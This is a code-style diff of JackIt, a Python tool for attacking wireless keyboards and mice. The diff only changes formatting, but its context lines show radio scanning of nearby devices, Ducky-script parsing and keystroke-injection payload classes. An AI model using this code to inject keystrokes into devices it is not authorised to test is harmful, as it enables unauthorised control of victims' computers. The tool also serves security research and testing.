@@ -22,6 +22,7 @@ GR = '\033[37m'  # gray
 
 enable_debug = False
 
+
 class DuckyParser:
     hid_map = {
         'a':            [4, False],
@@ -161,7 +162,7 @@ class DuckyParser:
         "char": '',
         "sleep": 0
     }
-        
+
     def __init__(self, attack_script):
         self.script = attack_script.split("\n")
 
@@ -226,7 +227,7 @@ class DuckyParser:
                 pass
             else:
                 print "CAN'T PROCESS... %s" % line
-        
+
         return entries
 
 
@@ -244,7 +245,7 @@ class NordicScanner:
 
     def _debug(self, text):
         if self.debug:
-            print  P + "[D] " + W + text
+            print P + "[D] " + W + text
 
     def hexify(self, data):
         return ':'.join('{:02X}'.format(x) for x in data)
@@ -284,7 +285,7 @@ class NordicScanner:
                         if len(payload) > len(self.devices[a]['payload']) and len(payload) < 20:
                             self.devices[a]['payload'] = payload
                     else:
-                            self.devices[a] = { 'address': address, 'channels': [self.channels[self.channel_index]], 'count': 1, 'payload': payload }
+                            self.devices[a] = {'address': address, 'channels': [self.channels[self.channel_index]], 'count': 1, 'payload': payload}
                             self.devices[a]['timestamp'] = time.time()
         except RuntimeError:
             exit(-1)
@@ -375,7 +376,7 @@ class NordicGenericHID:
                     self.send_key()
                 elif c['sleep']:
                     time.sleep(int(c['sleep']) / 1000)
-        
+
         self.send_key()
 
 
@@ -397,6 +398,7 @@ class MicrosoftMouseDefaultHID(NordicGenericHID):
             self.payload[7] |= 0x08
         if key['shift']:
             self.payload[7] |= 0x02
+
 
 class MicrosoftMouseEncryptHID(MicrosoftMouseDefaultHID):
     def configure(self):
@@ -424,7 +426,7 @@ class MicrosoftKeyboardEncryptHID(MicrosoftMouseEncryptHID):
         self.payload[4:6] = [0, 0]
         self.payload[6] = 67
         self.clear_payload()
-    
+
     def clear_payload(self):
         self.payload[7:15] = [0, 0, 0, 0, 0, 0, 0, 0]
 
@@ -453,20 +455,22 @@ def fingerprint_device(r, a, p):
 
 def _debug(debug, text):
     if debug:
-        print  P + "[D] " + W + text
+        print P + "[D] " + W + text
+
 
 def banner():
     print """
-     ____.              __   .___  __   
-    |    |____    ____ |  | _|   |/  |_ 
+     ____.              __   .___  __
+    |    |____    ____ |  | _|   |/  |_
     |    \__  \ _/ ___\|  |/ /   \   __\\
-/\__|    |/ __ \\\\  \___|    <|   ||  |  
-\________(____  /\___  >__|_ \___||__|  
+/\__|    |/ __ \\\\  \___|    <|   ||  |
+\________(____  /\___  >__|_ \___||__|
               \/     \/     \/          """
 
     print "JackIt Version %0.2f" % __version__
     print "Created by %s" % __authors__
     print ""
+
 
 def confirmroot():
     # make sure we are root
@@ -474,6 +478,7 @@ def confirmroot():
         print R + "[!] " + W + "ERROR: You need to run as root!"
         print R + "[!] " + W + "login as root (su root) or try sudo ./jackit.py"
         exit(-1)
+
 
 @click.command()
 @click.option('--debug', is_flag=True, help='Enable debug.')
@@ -493,10 +498,10 @@ def cli(debug, script, lowpower, interval):
         print R + '[!] ' + W + "Attacks are disabled."
         attack = ""
     else:
-        f = open(script,'r')
+        f = open(script, 'r')
         parser = DuckyParser(f.read())
         attack = parser.parse()
-        
+
     # Initialize the radio
     try:
         radio = nrf24.nrf24(0)
@@ -526,7 +531,7 @@ def cli(debug, script, lowpower, interval):
                 click.clear()
                 print GR + "[+] " + W + ("Scanning every %ds " % interval) + G + "CTRL-C " + W + "when ready."
                 print ""
-                
+
                 idx = 0
                 pretty_devices = []
                 for key, device in devices.iteritems():
@@ -540,8 +545,7 @@ def cli(debug, script, lowpower, interval):
                         scan.hexify(device['payload'])
                     ])
 
-
-                print tabulate.tabulate(pretty_devices, headers=["KEY","ADDRESS","CHANNELS","COUNT","SEEN","PACKET"])
+                print tabulate.tabulate(pretty_devices, headers=["KEY", "ADDRESS", "CHANNELS", "COUNT", "SEEN", "PACKET"])
         except KeyboardInterrupt:
             print ""
 
@@ -552,9 +556,9 @@ def cli(debug, script, lowpower, interval):
         if attack == "":
             print R + "[!] " + W + "No attack script was provided..."
             exit(-1)
-        
+
         print GR + "\n[+] " + W + "Select " + G + "target keys" + W + " (" + G + "1-%s)" % (str(len(devices)) + W) + \
-                    " separated by commas, or '%s': " % (G + 'all' + W),
+            " separated by commas, or '%s': " % (G + 'all' + W),
         value = click.prompt('', default="all")
         value = value.strip().lower()
 
@@ -580,7 +584,7 @@ def cli(debug, script, lowpower, interval):
 
             scan.sniff(address)
             device = fingerprint_device(radio, address, payload)
-            
+
             if device:
                 for channel in channels:
                     radio.set_channel(channel)
